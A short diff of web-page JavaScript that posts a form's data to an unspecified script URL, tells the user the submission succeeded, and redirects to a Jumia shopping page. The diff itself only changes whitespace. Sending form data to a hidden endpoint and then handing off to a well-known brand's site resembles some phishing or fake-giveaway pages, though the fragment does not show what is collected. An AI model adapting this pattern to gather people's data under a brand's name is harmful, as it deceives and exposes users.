@@ -223,7 +223,8 @@
                 fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                   .then(response => alert("You have successfully submitted. You will now be redirected to Jumia"))
                   .catch(error => console.error('Error!', error.message))
-                setTimeout(() => {
+                
+                  setTimeout(() => {
                     window.location.replace("https://www.jumia.com.ng/3smart/");
                 }, 3000);
                   
